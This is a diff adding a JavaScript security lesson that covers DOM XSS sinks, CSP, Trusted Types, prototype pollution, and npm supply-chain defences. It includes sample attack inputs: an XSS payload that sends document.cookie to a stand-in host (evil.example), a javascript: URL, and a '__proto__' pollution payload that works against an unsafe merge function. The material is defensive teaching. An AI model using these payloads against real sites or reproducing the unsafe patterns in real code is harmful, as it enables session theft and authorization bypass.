@@ -1,0 +1,156 @@
+---
+title: "JavaScript Security: XSS, Prototype Pollution & Supply Chain"
+description: "The vulnerabilities specific to JavaScript code — DOM XSS sinks, prototype pollution, unsafe dynamic code, and npm supply-chain attacks — and the defences senior engineers put in place."
+module: "Pro Level"
+level: "pro"
+order: 27
+---
+
+Most security incidents in JavaScript applications don't come from exotic
+cryptography bugs. They come from a handful of language- and
+ecosystem-specific mistakes: untrusted strings reaching HTML, attacker
+controlled keys reaching `Object.prototype`, and code you never wrote
+arriving through `npm install`. A senior engineer is expected to spot these
+in code review and to set up defences that make them hard to introduce.
+(Regex denial of service was covered in the Regular Expressions lesson.)
+
+## DOM-based XSS: know your sinks
+
+Cross-site scripting happens when attacker-controlled data is interpreted
+as code in a victim's browser. In front-end code the danger lies in
+specific **sinks** — APIs that parse strings as HTML or JavaScript:
+
+```js
+const name = new URLSearchParams(location.search).get("name");
+// attacker link: ?name=<img src=x onerror="fetch('//evil.example?c='+document.cookie)">
+
+greeting.innerHTML = `Hello, ${name}`; // DANGEROUS: parsed as HTML, onerror runs
+greeting.textContent = `Hello, ${name}`; // SAFE: always treated as plain text
+```
+
+Dangerous sinks to flag in review: `innerHTML`, `outerHTML`,
+`insertAdjacentHTML`, `document.write`, `eval`, `new Function`,
+`setTimeout` or `setInterval` with a **string** argument, and `href` or
+`src` set from user input:
+
+```js
+const link = document.createElement("a");
+link.href = userUrl; // "javascript:alert(1)" would run code when clicked
+
+const url = new URL(userUrl, location.origin);
+if (url.protocol === "https:" || url.protocol === "http:") {
+  link.href = url.href; // allow-list the scheme instead
+}
+```
+
+Frameworks escape text by default — React's JSX, Angular templates and Vue's
+mustache syntax all set text, not HTML — so XSS in those apps almost always
+comes through the explicit escape hatches (`dangerouslySetInnerHTML`,
+`bypassSecurityTrustHtml`, `v-html`). When you truly must render user HTML
+(rich-text comments, Markdown), sanitise it with a maintained library such
+as DOMPurify; never write your own regex sanitiser.
+
+## Defence in depth: CSP and Trusted Types
+
+A **Content Security Policy** header limits what the browser will execute
+even if an injection slips through:
+
+```text
+Content-Security-Policy: script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'none'
+```
+
+Inline scripts without the per-response nonce and injected `onerror`
+handlers are blocked. **Trusted Types** (`require-trusted-types-for 'script'`)
+goes further: sinks like `innerHTML` reject plain strings and accept only
+values produced by a policy you define, so every HTML-writing path is
+funnelled through one reviewable function. It is supported in
+Chromium-based browsers; check support for your other target browsers.
+
+## Prototype pollution
+
+Because almost every object inherits from `Object.prototype`, writing to it
+changes the behaviour of the whole program. The classic vector is a
+recursive merge of user-controlled JSON:
+
+```js
+function merge(target, source) {
+  for (const key in source) {
+    if (typeof source[key] === "object" && source[key] !== null) {
+      target[key] ??= {};
+      merge(target[key], source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
+merge({}, payload);
+
+console.log({}.isAdmin); // true — EVERY object in the process is now an "admin"
+```
+
+`JSON.parse` creates `__proto__` as an ordinary own key, but `target[key]`
+with `key === "__proto__"` reaches the real prototype via the inherited
+accessor. Later code like `if (user.isAdmin)` is now bypassed. Subtle
+differences matter here:
+
+```js
+({ ...payload }).isAdmin;           // undefined — spread defines own properties
+Object.assign({}, payload).isAdmin; // true — assign uses [[Set]], which hits the setter
+```
+
+Defences, strongest first:
+
+- Use a `Map` for user-controlled keys, or objects with no prototype:
+  `Object.create(null)`.
+- Reject `__proto__`, `constructor` and `prototype` keys in any merge,
+  clone or "set by path" helper (`set(obj, "a.b.c", value)` utilities are a
+  frequent culprit).
+- Validate input against a schema before using it, so unexpected keys never
+  reach your logic.
+- Harden the runtime: `Object.freeze(Object.prototype)` at start-up, or run
+  Node with `--disable-proto=delete` to remove the `__proto__` accessor.
+
+In Node, polluted prototypes can escalate beyond logic bugs — for example
+when polluted properties flow into options objects for `child_process`
+calls — which is why it is treated as a serious vulnerability class.
+
+## Never execute strings
+
+`eval`, `new Function(code)` and string timers turn data into code and
+also block CSP from protecting you. There is almost always a safe
+alternative: `JSON.parse` for data, a lookup table for dynamic dispatch,
+and `Function`-free template engines. On Node servers the same principle
+applies to shell commands — pass arguments as an array to `execFile` or
+`spawn` instead of building a command string for `exec`.
+
+## Supply-chain security
+
+A typical app has hundreds of transitive npm dependencies, each able to run
+code at install time and at runtime. Real attacks have included
+typosquatted package names, hijacked maintainer accounts publishing
+malicious versions, and malicious install scripts.
+
+```bash
+npm ci                     # install exactly what package-lock.json pins; fail if it's out of sync
+npm audit                  # report dependencies with known advisories
+npm ci --ignore-scripts    # skip install/postinstall scripts (in CI, where practical)
+npm audit signatures       # verify registry signatures and provenance attestations
+```
+
+Team-level practices: commit the lockfile and review changes to it like
+code; prefer fewer, well-maintained dependencies; let automated tools
+(Dependabot, Renovate) raise update PRs instead of blind `npm update`;
+use a short delay before adopting brand-new releases; and keep secrets out
+of the browser bundle entirely — anything shipped to the client is public.
+
+### Try it yourself
+
+Write a `safeMerge(target, source)` that defeats the payload above: skip
+dangerous keys, build nested objects with `Object.create(null)`, and add a
+test proving `({}).isAdmin` stays `undefined` after merging
+`JSON.parse('{"__proto__":{"isAdmin":true},"constructor":{"prototype":{"x":1}}}')`.
+Then run the same test against the unsafe `merge` under
+`node --disable-proto=delete` and explain what changes.
